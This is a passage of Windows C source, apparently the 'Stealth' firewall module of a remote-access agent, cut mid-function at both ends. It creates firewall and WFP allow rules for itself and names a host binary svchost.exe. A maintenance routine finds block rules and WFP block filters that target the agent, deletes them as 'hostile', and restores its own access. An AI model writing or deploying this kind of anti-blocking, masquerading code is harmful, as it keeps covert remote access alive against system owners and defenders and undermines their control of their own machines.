            if (SUCCEEDED(var.pdispVal->lpVtbl->QueryInterface(var.pdispVal, &IID_INetFwRule, (void**)&rule)) &&
                rule != NULL)
            {
                BSTR currentName = NULL;
                if (SUCCEEDED(rule->lpVtbl->get_Name(rule, &currentName)) &&
                    currentName != NULL &&
                    _wcsicmp(currentName, ruleName) == 0)
                {
                    exists = TRUE;
                }
                Stealth_FreeBstr(&currentName);
                rule->lpVtbl->Release(rule);
            }
        }

        VariantClear(&var);
        if (exists) { break; }
    }

cleanup:
    if (pEnum != NULL) { pEnum->lpVtbl->Release(pEnum); }
    if (pEnumUnknown != NULL) { pEnumUnknown->lpVtbl->Release(pEnumUnknown); }
    if (pFwRules != NULL) { pFwRules->lpVtbl->Release(pFwRules); }
    if (pNetFwPolicy2 != NULL) { pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2); }
    Stealth_ComUninit(didCoInit);
    return exists;
}

static BOOL Stealth_AddFirewallRuleEx(
    const wchar_t* ruleName,
    const wchar_t* serviceName,
    const wchar_t* appPath,
    NET_FW_RULE_DIRECTION direction,
    LONG protocol,
    BOOL edgeTraversal,
    const wchar_t* description)
{
    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    INetFwRules *pFwRules = NULL;
    INetFwRule *pFwRule = NULL;
    BSTR bstrRuleName = NULL;
    BSTR bstrServiceName = NULL;
    BSTR bstrAppPath = NULL;
    BSTR bstrDescription = NULL;
    BOOL success = FALSE;
    BOOL didCoInit = FALSE;

    if (ruleName == NULL || ruleName[0] == L'\0' || appPath == NULL || appPath[0] == L'\0') { return FALSE; }

    // Initialize COM
    if (!Stealth_ComInit(&didCoInit)) { return FALSE; }

    // Create firewall policy object
    hr = CoCreateInstance(
        &CLSID_NetFwPolicy2,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_INetFwPolicy2,
        (void**)&pNetFwPolicy2
    );

    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Get firewall rules collection
    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Create new firewall rule
    hr = CoCreateInstance(
        &CLSID_NetFwRule,
        NULL,
        CLSCTX_INPROC_SERVER,
        &IID_INetFwRule,
        (void**)&pFwRule
    );

    if (FAILED(hr))
    {
        goto cleanup;
    }

    // Configure rule
    bstrRuleName = SysAllocString(ruleName);
    bstrAppPath = SysAllocString(appPath);
    if (serviceName != NULL && serviceName[0] != L'\0')
    {
        bstrServiceName = SysAllocString(serviceName);
    }
    if (description != NULL && description[0] != L'\0')
    {
        bstrDescription = SysAllocString(description);
    }

    if (bstrRuleName == NULL || bstrAppPath == NULL ||
        ((serviceName != NULL && serviceName[0] != L'\0') && bstrServiceName == NULL))
    {
        goto cleanup;
    }

    hr = pFwRule->lpVtbl->put_Name(pFwRule, bstrRuleName);
    if (FAILED(hr)) { goto cleanup; }
    hr = pFwRule->lpVtbl->put_ApplicationName(pFwRule, bstrAppPath);
    if (FAILED(hr)) { goto cleanup; }
    if (bstrServiceName != NULL)
    {
        hr = pFwRule->lpVtbl->put_ServiceName(pFwRule, bstrServiceName);
        if (FAILED(hr)) { goto cleanup; }
    }
    hr = pFwRule->lpVtbl->put_Action(pFwRule, NET_FW_ACTION_ALLOW);
    if (FAILED(hr)) { goto cleanup; }
    hr = pFwRule->lpVtbl->put_Enabled(pFwRule, VARIANT_TRUE);
    if (FAILED(hr)) { goto cleanup; }
    hr = pFwRule->lpVtbl->put_Profiles(pFwRule, NET_FW_PROFILE2_ALL);
    if (FAILED(hr)) { goto cleanup; }
    hr = pFwRule->lpVtbl->put_Direction(pFwRule, direction);
    if (FAILED(hr)) { goto cleanup; }
    hr = pFwRule->lpVtbl->put_Protocol(pFwRule, protocol);
    if (FAILED(hr)) { goto cleanup; }
    hr = pFwRule->lpVtbl->put_EdgeTraversal(pFwRule, edgeTraversal ? VARIANT_TRUE : VARIANT_FALSE);
    if (FAILED(hr)) { goto cleanup; }
    if (bstrDescription != NULL)
    {
        hr = pFwRule->lpVtbl->put_Description(pFwRule, bstrDescription);
        if (FAILED(hr)) { goto cleanup; }
    }

    // Remove any existing rules with the same name to avoid duplicates.
    (void)Stealth_RemoveRuleByName(pFwRules, ruleName);

    // Add rule to firewall
    hr = pFwRules->lpVtbl->Add(pFwRules, pFwRule);
    if (SUCCEEDED(hr))
    {
        success = TRUE;
    }

cleanup:
    if (bstrRuleName) SysFreeString(bstrRuleName);
    if (bstrServiceName) SysFreeString(bstrServiceName);
    if (bstrAppPath) SysFreeString(bstrAppPath);
    if (bstrDescription) SysFreeString(bstrDescription);
    if (pFwRule) pFwRule->lpVtbl->Release(pFwRule);
    if (pFwRules) pFwRules->lpVtbl->Release(pFwRules);
    if (pNetFwPolicy2) pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2);

    Stealth_ComUninit(didCoInit);
    return success;
}

BOOL Stealth_AddFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath)
{
    wchar_t ruleName[256];

    // Create rule name
    swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_OUTBOUND_FMT, serviceName);

    // Add outbound rule
    if (!Stealth_AddFirewallRuleEx(ruleName, serviceName, exePath, NET_FW_RULE_DIR_OUT, NET_FW_IP_PROTOCOL_ANY, FALSE, NULL))
    {
        return FALSE;
    }

    return TRUE;
}

BOOL Stealth_AddWebRtcFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath, BOOL forHostBinary)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
    if (exePath == NULL || exePath[0] == L'\0') { return FALSE; }

    wchar_t ruleName[256];
    if (forHostBinary)
    {
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_WEBRTC_HOST_FMT, serviceName);
    }
    else
    {
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_WEBRTC_AGENT_FMT, serviceName);
    }

    return Stealth_AddFirewallRuleEx(ruleName, serviceName, exePath, NET_FW_RULE_DIR_IN, NET_FW_IP_PROTOCOL_UDP, TRUE, STEALTH_FW_WEBRTC_DESCRIPTION);
}

BOOL Stealth_RemoveFirewallRuleForService(const wchar_t* serviceName)
{
    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    INetFwRules *pFwRules = NULL;
    BOOL success = FALSE;
    wchar_t ruleName[256];
    BOOL didCoInit = FALSE;

    // Initialize COM
    if (!Stealth_ComInit(&didCoInit)) { return FALSE; }

    // Create firewall policy object
    hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER,
                          &IID_INetFwPolicy2, (void**)&pNetFwPolicy2);
    if (FAILED(hr)) { Stealth_ComUninit(didCoInit); return FALSE; }

    // Get rules collection
    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (SUCCEEDED(hr) && pFwRules)
    {
        BOOL removedAny = FALSE;
        BOOL removeFailed = FALSE;
        // Remove outbound rule
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_OUTBOUND_FMT, serviceName);
        if (!Stealth_RemoveRuleByName(pFwRules, ruleName))
        {
            removeFailed = TRUE;
            Stealth_LogInstallEvent(L"[WARN] Firewall rule remove failed (%ls)", ruleName);
        }
        else { removedAny = TRUE; }

        // Attempt to remove inbound rule if it exists
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_INBOUND_FMT, serviceName);
        if (!Stealth_RemoveRuleByName(pFwRules, ruleName))
        {
            removeFailed = TRUE;
            Stealth_LogInstallEvent(L"[WARN] Firewall rule remove failed (%ls)", ruleName);
        }
        else { removedAny = TRUE; }

        // Remove WebRTC rules (host + agent)
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_WEBRTC_HOST_FMT, serviceName);
        if (!Stealth_RemoveRuleByName(pFwRules, ruleName))
        {
            removeFailed = TRUE;
            Stealth_LogInstallEvent(L"[WARN] Firewall rule remove failed (%ls)", ruleName);
        }
        else { removedAny = TRUE; }

        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_WEBRTC_AGENT_FMT, serviceName);
        if (!Stealth_RemoveRuleByName(pFwRules, ruleName))
        {
            removeFailed = TRUE;
            Stealth_LogInstallEvent(L"[WARN] Firewall rule remove failed (%ls)", ruleName);
        }
        else { removedAny = TRUE; }

        success = (!removeFailed);
        if (success && removedAny)
        {
            Stealth_LogInstallEvent(L"Removed firewall rules for %ls", serviceName);
        }
        pFwRules->lpVtbl->Release(pFwRules);
    }

    if (pNetFwPolicy2) { pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2); }
    Stealth_ComUninit(didCoInit);
    if (!Stealth_RemoveWfpHardPermitForService(serviceName))
    {
        success = FALSE;
    }
    return success;
}

BOOL Stealth_RemoveFirewallRulesByExePath(const wchar_t* exePath)
{
    if (exePath == NULL || exePath[0] == L'\0') { return TRUE; }

    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    INetFwRules *pFwRules = NULL;
    IUnknown *pEnumUnknown = NULL;
    IEnumVARIANT *pEnum = NULL;
    BOOL success = TRUE;
    BOOL didCoInit = FALSE;
    StealthFirewallRuleNameList ruleNames;
    VARIANT var;
    ULONG fetched = 0;

    ZeroMemory(&ruleNames, sizeof(ruleNames));

    if (!Stealth_ComInit(&didCoInit)) { return FALSE; }

    hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER,
                          &IID_INetFwPolicy2, (void**)&pNetFwPolicy2);
    if (FAILED(hr)) { Stealth_ComUninit(didCoInit); return FALSE; }

    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (FAILED(hr) || pFwRules == NULL)
    {
        if (pNetFwPolicy2) { pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2); }
        Stealth_ComUninit(didCoInit);
        return FALSE;
    }

    hr = pFwRules->lpVtbl->get__NewEnum(pFwRules, &pEnumUnknown);
    if (SUCCEEDED(hr) && pEnumUnknown)
    {
        hr = pEnumUnknown->lpVtbl->QueryInterface(pEnumUnknown, &IID_IEnumVARIANT, (void**)&pEnum);
    }
    if (FAILED(hr) || pEnum == NULL)
    {
        if (pEnumUnknown) { pEnumUnknown->lpVtbl->Release(pEnumUnknown); }
        pFwRules->lpVtbl->Release(pFwRules);
        pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2);
        Stealth_ComUninit(didCoInit);
        return FALSE;
    }

    while (TRUE)
    {
        VariantInit(&var);
        hr = pEnum->lpVtbl->Next(pEnum, 1, &var, &fetched);
        if (hr != S_OK)
        {
            VariantClear(&var);
            break;
        }

        if (var.vt == VT_DISPATCH && var.pdispVal)
        {
            INetFwRule* rule = NULL;
            hr = var.pdispVal->lpVtbl->QueryInterface(var.pdispVal, &IID_INetFwRule, (void**)&rule);
            if (SUCCEEDED(hr) && rule)
            {
                BSTR appName = NULL;
                if (SUCCEEDED(rule->lpVtbl->get_ApplicationName(rule, &appName)) && appName)
                {
                    if (_wcsicmp(appName, exePath) == 0)
                    {
                        BSTR ruleName = NULL;
                        if (SUCCEEDED(rule->lpVtbl->get_Name(rule, &ruleName)) && ruleName)
                        {
                            if (!Stealth_AppendFirewallRuleName(&ruleNames, ruleName))
                            {
                                success = FALSE;
                            }
                            SysFreeString(ruleName);
                        }
                    }
                    SysFreeString(appName);
                }
                rule->lpVtbl->Release(rule);
            }
        }
        VariantClear(&var);
    }

    pEnum->lpVtbl->Release(pEnum);
    if (pEnumUnknown) { pEnumUnknown->lpVtbl->Release(pEnumUnknown); }
    if (!Stealth_RemoveFirewallRulesByNameList(pFwRules, &ruleNames, NULL))
    {
        success = FALSE;
    }
    pFwRules->lpVtbl->Release(pFwRules);
    pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2);
    Stealth_FreeFirewallRuleNameList(&ruleNames);
    Stealth_ComUninit(didCoInit);
    return success;
}

static BOOL Stealth_RemoveFirewallBlockRulesByExePath(const wchar_t* exePath, UINT32* removedCount)
{
    if (removedCount != NULL) { *removedCount = 0; }
    if (exePath == NULL || exePath[0] == L'\0') { return TRUE; }

    HRESULT hr = S_OK;
    INetFwPolicy2 *pNetFwPolicy2 = NULL;
    INetFwRules *pFwRules = NULL;
    IUnknown *pEnumUnknown = NULL;
    IEnumVARIANT *pEnum = NULL;
    BOOL success = TRUE;
    BOOL didCoInit = FALSE;
    StealthFirewallRuleNameList ruleNames;
    VARIANT var;
    ULONG fetched = 0;

    ZeroMemory(&ruleNames, sizeof(ruleNames));

    if (!Stealth_ComInit(&didCoInit)) { return FALSE; }

    hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER,
                          &IID_INetFwPolicy2, (void**)&pNetFwPolicy2);
    if (FAILED(hr)) { Stealth_ComUninit(didCoInit); return FALSE; }

    hr = pNetFwPolicy2->lpVtbl->get_Rules(pNetFwPolicy2, &pFwRules);
    if (FAILED(hr) || pFwRules == NULL)
    {
        if (pNetFwPolicy2) { pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2); }
        Stealth_ComUninit(didCoInit);
        return FALSE;
    }

    hr = pFwRules->lpVtbl->get__NewEnum(pFwRules, &pEnumUnknown);
    if (SUCCEEDED(hr) && pEnumUnknown != NULL)
    {
        hr = pEnumUnknown->lpVtbl->QueryInterface(pEnumUnknown, &IID_IEnumVARIANT, (void**)&pEnum);
    }
    if (FAILED(hr) || pEnum == NULL)
    {
        if (pEnumUnknown) { pEnumUnknown->lpVtbl->Release(pEnumUnknown); }
        pFwRules->lpVtbl->Release(pFwRules);
        pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2);
        Stealth_ComUninit(didCoInit);
        return FALSE;
    }

    while (TRUE)
    {
        VariantInit(&var);
        hr = pEnum->lpVtbl->Next(pEnum, 1, &var, &fetched);
        if (hr != S_OK)
        {
            VariantClear(&var);
            break;
        }

        if (var.vt == VT_DISPATCH && var.pdispVal != NULL)
        {
            INetFwRule* rule = NULL;
            hr = var.pdispVal->lpVtbl->QueryInterface(var.pdispVal, &IID_INetFwRule, (void**)&rule);
            if (SUCCEEDED(hr) && rule != NULL)
            {
                BSTR appName = NULL;
                NET_FW_ACTION action = NET_FW_ACTION_ALLOW;
                if (SUCCEEDED(rule->lpVtbl->get_Action(rule, &action)) &&
                    action == NET_FW_ACTION_BLOCK &&
                    SUCCEEDED(rule->lpVtbl->get_ApplicationName(rule, &appName)) &&
                    appName != NULL &&
                    _wcsicmp(appName, exePath) == 0)
                {
                    BSTR ruleName = NULL;
                    if (SUCCEEDED(rule->lpVtbl->get_Name(rule, &ruleName)) && ruleName != NULL)
                    {
                        if (!Stealth_AppendFirewallRuleName(&ruleNames, ruleName))
                        {
                            success = FALSE;
                        }
                        SysFreeString(ruleName);
                    }
                }
                if (appName != NULL) { SysFreeString(appName); }
                rule->lpVtbl->Release(rule);
            }
        }
        VariantClear(&var);
    }

    pEnum->lpVtbl->Release(pEnum);
    if (pEnumUnknown) { pEnumUnknown->lpVtbl->Release(pEnumUnknown); }
    if (!Stealth_RemoveFirewallRulesByNameList(pFwRules, &ruleNames, removedCount))
    {
        success = FALSE;
    }
    pFwRules->lpVtbl->Release(pFwRules);
    pNetFwPolicy2->lpVtbl->Release(pNetFwPolicy2);
    Stealth_FreeFirewallRuleNameList(&ruleNames);
    Stealth_ComUninit(didCoInit);
    return success;
}

static void Stealth_WfpDescribeProvider(HANDLE engine, const GUID* providerKey, wchar_t* buffer, size_t bufferCch)
{
    FWPM_PROVIDER0* provider = NULL;

    if (buffer == NULL || bufferCch == 0) { return; }
    buffer[0] = L'\0';

    if (engine != NULL && providerKey != NULL)
    {
        if (FwpmProviderGetByKey0(engine, providerKey, &provider) == ERROR_SUCCESS && provider != NULL)
        {
            if (provider->displayData.name != NULL && provider->displayData.name[0] != L'\0')
            {
                (void)StringCchCopyW(buffer, bufferCch, provider->displayData.name);
            }
            else if (provider->serviceName != NULL && provider->serviceName[0] != L'\0')
            {
                (void)StringCchPrintfW(buffer, bufferCch, L"service:%ls", provider->serviceName);
            }
            FwpmFreeMemory0((void**)&provider);
        }

        if (buffer[0] == L'\0')
        {
            WCHAR guidBuffer[64];
            if (StringFromGUID2(providerKey, guidBuffer, (int)_countof(guidBuffer)) > 0)
            {
                (void)StringCchCopyW(buffer, bufferCch, guidBuffer);
            }
        }
    }

    if (buffer[0] == L'\0')
    {
        (void)StringCchCopyW(buffer, bufferCch, L"(none)");
    }
}

static DWORD Stealth_RemoveBlockingWfpFiltersForLayer(HANDLE engine, const GUID* layerKey, const wchar_t* layerName, const FWP_BYTE_BLOB* expectedAppId, UINT32* removedCount)
{
    DWORD status = ERROR_SUCCESS;
    HANDLE enumHandle = NULL;
    FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate;

    if (engine == NULL || layerKey == NULL || expectedAppId == NULL) { return ERROR_INVALID_PARAMETER; }

    ZeroMemory(&enumTemplate, sizeof(enumTemplate));
    enumTemplate.layerKey = *layerKey;
    enumTemplate.actionMask = FWP_ACTION_BLOCK;

    status = FwpmFilterCreateEnumHandle0(engine, &enumTemplate, &enumHandle);
    if (status != ERROR_SUCCESS) { return status; }

    while (status == ERROR_SUCCESS)
    {
        FWPM_FILTER0** filters = NULL;
        UINT32 count = 0;

        status = FwpmFilterEnum0(engine, enumHandle, 64, &filters, &count);
        if (status != ERROR_SUCCESS)
        {
            break;
        }
        if (count == 0)
        {
            if (filters != NULL) { FwpmFreeMemory0((void**)&filters); }
            break;
        }

        for (UINT32 i = 0; i < count; ++i)
        {
            FWPM_FILTER0* filter = filters[i];
            wchar_t providerLabel[128];

            if (filter == NULL || filter->action.type != FWP_ACTION_BLOCK)
            {
                continue;
            }
            if (!Stealth_WfpFilterHasAppIdCondition(filter, expectedAppId))
            {
                continue;
            }

            DWORD deleteStatus = FwpmFilterDeleteById0(engine, filter->filterId);
            if (deleteStatus == ERROR_SUCCESS || deleteStatus == FWP_E_FILTER_NOT_FOUND)
            {
                Stealth_WfpDescribeProvider(engine, filter->providerKey, providerLabel, _countof(providerLabel));
                Stealth_LogInstallEvent(
                    L"[FIREWALL] Removed hostile WFP block filter id=%I64u layer=%ls provider=%ls",
                    (unsigned long long)filter->filterId,
                    (layerName != NULL ? layerName : L"(unknown)"),
                    providerLabel);
                if (removedCount != NULL) { (*removedCount)++; }
            }
            else
            {
                status = deleteStatus;
                break;
            }
        }

        if (filters != NULL) { FwpmFreeMemory0((void**)&filters); }
        if (status != ERROR_SUCCESS) { break; }
    }

    if (enumHandle != NULL)
    {
        FwpmFilterDestroyEnumHandle0(engine, enumHandle);
    }
    return (status == FWP_E_FILTER_NOT_FOUND) ? ERROR_SUCCESS : status;
}

static DWORD Stealth_RemoveHostileWfpBlockFiltersForApp(const wchar_t* exePath, UINT32* removedCount)
{
    HANDLE engine = NULL;
    FWP_BYTE_BLOB* expectedAppId = NULL;
    DWORD status;

    if (removedCount != NULL) { *removedCount = 0; }
    if (exePath == NULL || exePath[0] == L'\0') { return ERROR_INVALID_PARAMETER; }

    status = Stealth_WfpOpenEngine(&engine);
    if (status != ERROR_SUCCESS) { return status; }

    status = FwpmGetAppIdFromFileName0(exePath, &expectedAppId);
    if (status != ERROR_SUCCESS || expectedAppId == NULL)
    {
        if (engine != NULL) { FwpmEngineClose0(engine); }
        return (status == ERROR_SUCCESS ? ERROR_INVALID_DATA : status);
    }

    status = Stealth_RemoveBlockingWfpFiltersForLayer(
        engine,
        &FWPM_LAYER_ALE_AUTH_CONNECT_V4,
        L"FWPM_LAYER_ALE_AUTH_CONNECT_V4",
        expectedAppId,
        removedCount);
    if (status == ERROR_SUCCESS)
    {
        status = Stealth_RemoveBlockingWfpFiltersForLayer(
            engine,
            &FWPM_LAYER_ALE_AUTH_CONNECT_V6,
            L"FWPM_LAYER_ALE_AUTH_CONNECT_V6",
            expectedAppId,
            removedCount);
    }

    if (expectedAppId != NULL) { FwpmFreeMemory0((void**)&expectedAppId); }
    if (engine != NULL) { FwpmEngineClose0(engine); }
    return status;
}

BOOL Stealth_CheckFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath)
{
    wchar_t ruleName[256];

    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }

    swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_OUTBOUND_FMT, serviceName);
    return Stealth_CheckFirewallRuleByProperties(
        ruleName,
        exePath,
        serviceName,
        VARIANT_TRUE,
        NET_FW_RULE_DIR_OUT,
        NET_FW_ACTION_ALLOW,
        FALSE,
        0,
        FALSE,
        VARIANT_FALSE);
}

BOOL Stealth_CheckWebRtcFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath, BOOL forHostBinary)
{
    wchar_t ruleName[256];

    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }

    if (forHostBinary)
    {
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_WEBRTC_HOST_FMT, serviceName);
    }
    else
    {
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), STEALTH_FW_RULE_WEBRTC_AGENT_FMT, serviceName);
    }
    return Stealth_CheckFirewallRuleByProperties(
        ruleName,
        exePath,
        serviceName,
        VARIANT_TRUE,
        NET_FW_RULE_DIR_IN,
        NET_FW_ACTION_ALLOW,
        TRUE,
        NET_FW_IP_PROTOCOL_UDP,
        TRUE,
        VARIANT_TRUE);
}

BOOL Stealth_CheckFirewallRuleExists(const wchar_t* serviceName)
{
    wchar_t ruleName[256];

    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }

    const wchar_t* ruleFmts[] = {
        STEALTH_FW_RULE_OUTBOUND_FMT,
        STEALTH_FW_RULE_INBOUND_FMT,
        STEALTH_FW_RULE_WEBRTC_HOST_FMT,
        STEALTH_FW_RULE_WEBRTC_AGENT_FMT
    };

    for (int i = 0; i < (int)(_countof(ruleFmts)); ++i)
    {
        swprintf_s(ruleName, sizeof(ruleName)/sizeof(wchar_t), ruleFmts[i], serviceName);
        if (Stealth_IsFirewallRulePresentByName(ruleName))
        {
            return TRUE;
        }
    }

    return Stealth_CheckWfpHardPermitExists(serviceName);
}

BOOL Stealth_RunFirewallPolicyMaintenance(void)
{
    StealthInstallPaths paths;
    wchar_t serviceName[256] = {0};
    wchar_t hostExePath[MAX_PATH] = {0};
    BOOL success = TRUE;
    BOOL changed = FALSE;
    BOOL nrptChanged = FALSE;
    UINT32 removedBlockRules = 0;
    UINT32 removedWfpBlocks = 0;

    ZeroMemory(&paths, sizeof(paths));
    if (!Stealth_GetInstallPaths(&paths))
    {
        return TRUE;
    }
    if (paths.installDir[0] == L'\0' || paths.exePath[0] == L'\0')
    {
        return TRUE;
    }
    if (GetFileAttributesW(paths.installDir) == INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesW(paths.exePath) == INVALID_FILE_ATTRIBUTES)
    {
        return TRUE;
    }

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceName, _countof(serviceName));
    if (serviceName[0] == L'\0')
    {
        StringCchCopyW(serviceName, _countof(serviceName), STEALTH_FALLBACK_SERVICE_NAME);
    }

    StringCchPrintfW(hostExePath, _countof(hostExePath), L"%s\\svchost.exe", paths.installDir);
    if (GetFileAttributesW(hostExePath) == INVALID_FILE_ATTRIBUTES)
    {
        StringCchCopyW(hostExePath, _countof(hostExePath), L"C:\\Windows\\System32\\svchost.exe");
    }

    if (InterlockedCompareExchange(&g_StealthPolicyMaintenanceActive, 1, 0) != 0)
    {
        return TRUE;
    }

    __try
    {
        if (!Stealth_EnsureFirewallPolicyRealtimeGuards(paths.exePath))
        {
            success = FALSE;
        }

        if (!Stealth_EnsureNrptPolicies(&paths, &nrptChanged))
        {
            success = FALSE;
        }
        else if (nrptChanged)
        {
            changed = TRUE;
        }

    __try
    {
        Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: scanning firewall block rules for %ls", paths.exePath);
        if (!Stealth_RemoveFirewallBlockRulesByExePath(paths.exePath, &removedBlockRules))
        {
            success = FALSE;
        }
        else if (removedBlockRules > 0)
        {
            changed = TRUE;
            Stealth_LogInstallEvent(L"[FIREWALL] Removed %lu hostile block rule(s) for %ls", (unsigned long)removedBlockRules, paths.exePath);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
        Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step RemoveFirewallBlockRules raised exception 0x%08lX", (unsigned long)GetExceptionCode());
    }

    BOOL outboundRuleHealthy = FALSE;
    __try
    {
        Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: validating outbound allow rule for %ls", serviceName);
        outboundRuleHealthy = Stealth_CheckFirewallRuleForService(serviceName, hostExePath);
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
        outboundRuleHealthy = FALSE;
        Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step CheckFirewallRuleForService raised exception 0x%08lX", (unsigned long)GetExceptionCode());
    }
    if (!outboundRuleHealthy)
    {
        __try
        {
            Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: recreating outbound allow rule for %ls", serviceName);
            if (Stealth_AddFirewallRuleForService(serviceName, hostExePath))
            {
                changed = TRUE;
                Stealth_LogInstallEvent(L"[FIREWALL] Recreated outbound allow rule for %ls", serviceName);
            }
            else
            {
                success = FALSE;
                Stealth_LogInstallEvent(L"[WARN] Failed to recreate outbound allow rule for %ls", serviceName);
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER)
        {
            success = FALSE;
            Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step AddFirewallRuleForService raised exception 0x%08lX", (unsigned long)GetExceptionCode());
        }
    }

    BOOL wfpHealthy = FALSE;
    __try
    {
        Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: validating WFP hard permit for %ls", paths.exePath);
        wfpHealthy = Stealth_CheckWfpHardPermitForApp(serviceName, paths.exePath);
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
        wfpHealthy = FALSE;
        Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step CheckWfpHardPermitForApp raised exception 0x%08lX", (unsigned long)GetExceptionCode());
    }
    if (!wfpHealthy)
    {
        __try
        {
            Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: recreating WFP hard permit for %ls", paths.exePath);
            if (Stealth_AddWfpHardPermitForApp(serviceName, paths.exePath))
            {
                changed = TRUE;
                Stealth_LogInstallEvent(L"[FIREWALL] Recreated WFP hard permit for %ls", paths.exePath);
            }
            else
            {
                success = FALSE;
                Stealth_LogInstallEvent(L"[WARN] Failed to recreate WFP hard permit for %ls", paths.exePath);
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER)
        {
            success = FALSE;
            Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step AddWfpHardPermitForApp raised exception 0x%08lX", (unsigned long)GetExceptionCode());
        }
    }

    BOOL hostWebRtcHealthy = FALSE;
    __try
    {
        Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: validating host WebRTC rule for %ls", hostExePath);
        hostWebRtcHealthy = Stealth_CheckWebRtcFirewallRuleForService(serviceName, hostExePath, TRUE);
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
        hostWebRtcHealthy = FALSE;
        Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step CheckWebRtcFirewallRuleForService(host) raised exception 0x%08lX", (unsigned long)GetExceptionCode());
    }
    if (!hostWebRtcHealthy)
    {
        __try
        {
            Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: recreating host WebRTC rule for %ls", hostExePath);
            if (Stealth_AddWebRtcFirewallRuleForService(serviceName, hostExePath, TRUE))
            {
                changed = TRUE;
                Stealth_LogInstallEvent(L"[FIREWALL] Recreated host WebRTC rule for %ls", serviceName);
            }
            else
            {
                success = FALSE;
                Stealth_LogInstallEvent(L"[WARN] Failed to recreate host WebRTC rule for %ls", serviceName);
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER)
        {
            success = FALSE;
            Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step AddWebRtcFirewallRuleForService(host) raised exception 0x%08lX", (unsigned long)GetExceptionCode());
        }
    }

    BOOL agentWebRtcHealthy = FALSE;
    __try
    {
        Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: validating agent WebRTC rule for %ls", paths.exePath);
        agentWebRtcHealthy = Stealth_CheckWebRtcFirewallRuleForService(serviceName, paths.exePath, FALSE);
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
        agentWebRtcHealthy = FALSE;
        Stealth_LogInstallEvent(L"[WARN] Firewall maintenance step CheckWebRtcFirewallRuleForService(agent) raised exception 0x%08lX", (unsigned long)GetExceptionCode());
    }
    if (!agentWebRtcHealthy)
    {
        __try
        {
            Stealth_LogInstallEvent(L"[FIREWALL] Maintenance: recreating agent WebRTC rule for %ls", paths.exePath);
            if (Stealth_AddWebRtcFirewallRuleForService(serviceName, paths.exePath, FALSE))
            {
                changed = TRUE;
                Stealth_LogInstallEvent(L"[FIREWALL] Recreated agent WebRTC rule for %ls", serviceName);
            }
            else
            {
                success = FALSE;
                Stealth_LogInstallEvent(L"[WARN] Failed to recreate agent WebRTC rule for %ls", serviceName);
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER)
        {
